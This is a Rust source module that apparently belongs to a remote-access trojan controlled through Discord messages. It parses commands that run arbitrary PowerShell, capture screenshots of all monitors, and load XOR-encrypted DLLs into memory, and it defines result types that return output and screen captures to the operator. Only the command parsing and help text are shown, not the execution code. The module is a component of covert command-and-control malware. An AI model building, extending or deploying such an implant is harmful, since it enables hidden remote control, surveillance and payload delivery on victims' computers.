//! Command types and models
//!
//! Contains the command parsing logic and result types.

/// Available commands help text
const HELP_TEXT: &str = "**Available commands:**\n\
    - `shell <command>` - Execute a PowerShell command\n\
    - `scr` - Take a screenshot of all monitors\n\
    - `!loaddll [name]` - Load attached DLL (XOR encrypted) into memory\n\
    - `help` - Show this help message";

/// Generate help message for unknown commands
pub fn get_help_message(unknown_cmd: &str) -> CommandResult {
    if unknown_cmd.is_empty() {
        CommandResult::TextResponse(HELP_TEXT.to_string())
    } else {
        CommandResult::TextResponse(format!(
            "Unknown command: `{}`\n\n{}",
            unknown_cmd, HELP_TEXT
        ))
    }
}

/// Represents a parsed command from Discord
#[derive(Debug, Clone)]
pub enum Command {
    /// Execute a shell command via PowerShell
    /// Format: "shell <command>"
    Shell(String),

    /// Take a screenshot of all monitors
    /// Format: "scr"
    Screenshot,

    /// Load a DLL from attachment
    /// Format: "!loaddll [dll_name]"
    LoadDll(String),

    /// Show help message
    /// Format: "help"
    Help,

    /// Unknown command
    Unknown(String),
}

impl Command {
    /// Parse a command from a Discord message content
    ///
    /// Supported commands:
    /// - `shell <command>` - Execute a PowerShell command
    /// - `scr` - Take a screenshot
    /// - `!loaddll [name]` - Load attached DLL
    /// - `help` - Show help
    pub fn parse(content: &str) -> Self {
        let content = content.trim();
        let content_lower = content.to_ascii_lowercase();

        // Check for "scr" command
        if content_lower == "scr" {
            return Command::Screenshot;
        }

        // Check for "help" command
        if content_lower == "help" {
            return Command::Help;
        }

        // Check for "shell " prefix
        if let Some(rest) = content_lower.strip_prefix("shell ") {
            if !rest.trim().is_empty() {
                let cmd = content["shell ".len()..].trim().to_string();
                return Command::Shell(cmd);
            }
        }

        // Check for "!loaddll" prefix
        if content_lower.starts_with("!loaddll") || content_lower.starts_with("loaddll") {
            let prefix_len = if content_lower.starts_with("!loaddll") {
                "!loaddll".len()
            } else {
                "loaddll".len()
            };
            
            let dll_name = content[prefix_len..].trim().to_string();
            return Command::LoadDll(dll_name);
        }

        Command::Unknown(content.to_string())
    }
}

/// Result of command execution
#[derive(Debug)]
#[allow(dead_code)]
pub enum CommandResult {
    /// Command produced output that should be sent as a file
    FileOutput {
        /// The content to send as a file
        content: String,
        /// Suggested filename
        filename: String,
    },

    /// Command produced binary output (e.g., screenshot)
    BinaryOutput {
        /// The binary data to send
        data: Vec<u8>,
        /// Suggested filename
        filename: String,
        /// MIME type for the file
        mime_type: String,
    },

    /// Command produced a simple text response
    TextResponse(String),

    /// Command failed with an error message
    Error(String),
}
